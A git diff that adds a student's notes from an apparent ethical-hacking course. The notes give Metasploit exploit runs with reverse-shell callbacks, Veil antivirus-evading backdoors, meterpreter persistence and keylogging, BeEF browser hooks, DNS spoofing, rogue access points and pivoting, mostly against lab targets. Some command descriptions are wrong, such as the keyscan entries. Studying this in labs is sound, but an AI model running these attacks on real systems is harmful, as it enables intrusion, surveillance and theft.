@@ -185,7 +185,7 @@ MITM
 arpspoof
 ARP SPOOFING
 
-ADDRESS RESOLUTION PROTOCOL (ARP)
+`ADDRESS RESOLUTION PROTOCOL (ARP)`
 simple protocol used to map IP Address of a machine to its MAC address
 
 ```sh
@@ -277,7 +277,7 @@ ctrl + shift + del   to open chrome clear browsing data dialog
 ## chapter 43
 
 HSTS
-- HTTP Strict Transport Security.
+- `HTTP Strict Transport Security`(HTTP严格传输安全).
 - Used by Facebook, Twitter and few other famous websites.
 
 Problem:
@@ -292,3 +292,413 @@ twitter.com -> twiter.com
 
 SSL stripping
 
+## chapter 44
+
+```sh
+service apache2 start
+ifconfig
+
+vim /var/www/html/index.html
+```
+
+```sh
+> set dns.spoof.all true
+> set dns.spoof.domains zsecurity.org,*.zsecurity.org
+> dns.spoof on
+```
+not work for hsts
+
+## chapter 45
+Bettercap code injection
+
+- inject javascript code in loaded pages
+- code gets executed by the target browser
+- this can be used to 
+  - replace links
+  - replace images
+  - insert html elements
+  - hook target browser to exploitation frameworks
+  - +more!
+  - 
+```sh
+vim /usr/share/bettercap/caplets/hstshijack/hstshijack.cap
+# modifty the hstshijack.payloads line add the following
+*:/root/alert.js
+```
+not work for hsts
+
+## chapter 46
+- wireshark is a network protocol analyser.
+- designed to help network administrators to keep track of what is happening in their network
+
+How does it work?
+- logs packets that flow through the selected interface
+- analyse all the packets
+
+## chapter 49
+
+```sh
+# add the following line
+set net.sniff.output /root/capturefile.cap
+```
+
+## chapter 50
+fake access point
+wireless adapter that supports ap mode
+
+MANA-TOOLKIT
+- tools run rogue access point attacks
+- it can:
+  - automatically configure and create fake ap
+  - automatically sniff data
+  - automatically bypass https
+  - ...etc
+
+Mana has 3 main start scripts:
+1. start-noupstream.sh - start fake AP with no internet access.
+2. start-nat-simple.sh - start fake AP with internet access. most usefull.
+3. start-nat-full.sh -start fake AP with internet access, and automatically starts sniffing data, bypass https.
+
+wlan0
+- in manager mode
+- not connected to network
+
+```sh
+apt-get install mana-toolkit
+
+# to modify inferface and SSID
+vim /etc/mana-toolkit/hostpad-mana.conf
+
+# to modify upstream interface and phy
+vim /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
+bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh 
+```
+
+## chapter 52
+
+detect arp spoof
+
+XArp
+
+## chapter 53
+
+ARP Address Resolution Protocol
+
+## chapter 54
+
+Server side
+
+Client side
+
+## chapter 55
+
+metasploitable
+
+name: msfadmin
+pass: msfadmin
+
+## chapter 57
+
+- try default password(ssh iPad case).
+- Services might be mis-configured, such as the "r" service. Ports 512, 513, 514
+- some might even contain a back door
+- code execution vulnerabilities
+
+```sh
+id
+uname -a
+```
+
+## chapter 58
+- > msfconsole - runs the metasploit console
+- > help - shows help
+- > show [something] - something can be exploits, payloads, auxiliaries or options
+- > use [somethins] - use a certain exploit, payload or auxiliary.
+- > set [option] [value] - configure [option] to have a value of [value]
+- > exploit - runs the current task
+
+back door case
+```sh
+# in kali
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set RHOST [target_address]
+show options
+exploit     # may run more than one time
+```
+
+code execution vulnerabilities case
+## chapter 59
+```sh
+msfconsole
+use exploit/multi/samba/usermap_script
+show options
+set RHOST [target_address]
+show options
+show payloads
+set PAYLOAD cmd/unix/reverse_netcat
+set LHOST [my_own_address]
+show options
+set LPORT 5555    # just in case
+show options
+exploit
+```
+
+## chapter 60
+
+NEXPOSE
+
+```sh
+service postgresql stop
+chmod +x [installer file name]
+./[installer file name]
+```
+
+## chapter 63
+
+- use if server side attacks fail.
+- if IP is probably useless.
+- require user interaction.
+- social engineering can be very useful.
+- information gathing is vital.
+
+## chapter 64
+
+VEIL - framework
+
+- a backdoor is a file that gives us full control over the machine that it gets executed on.
+- backdoors can be caught by anti-virus programs.
+- veil is a framework for generating undetectable backdoors.
+
+```sh
+cd /opt
+git clone https://github.com/Veil-Framework/Veil.git
+cd Veil
+cd config
+./setup.sh --silent --force
+
+# after finished, start the program
+cd /opt/Veil
+./Veil.py
+> list
+> use 1
+> list
+> use 15
+> set LHOST 10.0.2.4
+> set LPORT 8080
+> options
+> generate
+# set other options to make the programs unique to avoid be dected by Anti-virus software
+```
+https://nodistribute.com/ don't share the scan results.
+
+## chapter 67
+
+Listen for incoming connections
+```sh
+msfconsole
+> use exploit/multi/handler         # selet a module
+> show options
+> set PAYLOAD windows/meterpreter/reverse_https
+> set LHOST 10.0.2.4       # your ip address
+> set LPORT 8080
+> show options
+> exploit
+```
+
+## chapter 68
+
+creat a folder in /var/www/html
+```
+service apache2 start
+```
+
+## chapter 71
+
+only download from https pages
+
+## chapter 73
+
+maltego
+
+## chapter 78
+
+backdoor any files
+
+urls="pic_url, exe_url"
+
+## chapter 79
+
+compile script to .exe
+
+## chapter 80
+
+app: Characters -> Right-to-left-override
+
+## chapter 83
+
+Beef: Browser Exploitation Framework
+
+- DNS spoof requests to a page containing the hook.
+- Inject the hook in browsed pages (need to be MITM)
+- Use XSS exploit
+- Social engineer the target to open a hook page.
+
+Usename: beef
+Password: haha
+```html
+# modify the ip to your own ip
+<script src="http://10.0.2.4:3000/hook.js"></script>
+```
+
+## chapter 88
+
+Analysing trojans
+- Check properties of the file.
+- Is it what it seems to be?
+- Run the file in a virtual machine and check resources.
+- Use an online Sandbox service.
+  <https://wwww.hybrid-analysis.com>
+
+Reverse DNS
+
+## chapter 92
+
+```sh
+route -n
+```
+Router IP forward:
+- download backdoor, use portn 80
+- reverse connecte, use port 8080
+- beef connect, use port 3000
+
+## chapter 95
+Post exploitation
+meterpreter basics
+- >help -shows help.
+- >background - backgorunds current session.
+- >sessions -l - lists all sessions.
+- >sessions -i [session id]- interact with a certain session.
+- >sysinfo - displays system info.
+- >ipconfig - displays info about interfaces.
+- >getuid - shows current user.
+
+```sh
+migrate [id]
+```
+
+## chapter 96
+
+- >pwd
+- >ls
+- >cd [location]
+- >cat [file] - prints the content of [file] on screen.
+- >download [file] - downloads [file].
+- >upload [file] - uploads [file].
+- >execute -f [file] - executes [file].
+
+## chapter 97
+
+persistence module of meterpreter
+
+```meterpreter
+run persistence -h
+run persistence -U -i 20 -p 80 -r 10.0.2.4
+```
+
+1. Using a veil-evasion
+   - Does not always work
+2. Using persistence module
+   - Detectable by antivirus programs
+3. Using metasploit + veil-evasion -> More robust + undetectable by Antivirus
+   - > use exploit/windows/local/persistence
+   - > set session [session id]
+   - > set exe:custom [backdoor location]
+   - > exploit
+
+## chapter 98
+```sh
+show advanced
+sessions -K       # kill session
+```
+
+## chapter 99
+
+Key logging
+log all mouse/keyboard events
+
+- > keyscan_start - shows current working directory
+- > keyscan_dump - lists files in the current working directory
+- > keyscan_stop - changes working directory to [location]
+- > screenshot - take a screenshot of the target computer
+
+## chapter 100
+
+pivoting
+
+- use the hacked device as a pivot.
+- try to gain access to other devices in the network.
+
+## chapter 101
+
+Pivoting using autoroute
+
+1. Use it 
+   > use post/windows/manage/autoroute
+2. Set subnet of target network
+   > set subnet [subnet]
+3. Set session id
+   > set session [id]
+4. exploit
+   > exploit
+
+```msf
+use exploit/multi/samba/usermap_script
+set RHOST 10.20.15.4       # set the ip of meterploitable
+show payloads
+set PAYLOAD cmd/unix/bind_netcat
+show options
+exploit
+```
+
+```msf
+use post/windows/manage/autoroute
+show options
+set SESSION 1
+set SUBNET 10.20.15.0
+exploit
+```
+
+## chapter 102
+
+web server sied: PHP, Python
+client side: JS
+
+## chapter 103
+
+web application pentesting
+server side attacks
+client side attacks
+
+DVWA
+username: admin
+password: password
+
+set security to low
+
+## chapter 104
+
+- IP address
+- Domain name info
+- Technologies used
+- Other websites on the same server
+- DNS records
+- Unlisted files, sub-domains, directories
+
+1. Whois Lookup - Find info about the owner of the target.
+   <http://whois.domaintools.com/>
+2. Netcraft Site Report - Shows technologies used on the target.
+   <http://toolbar.netcraft.com/site_report?url=>
+3. Rebtex DNS lookup - Shows comprehensive info about the target website.
+   <https://www.robtex.com/>
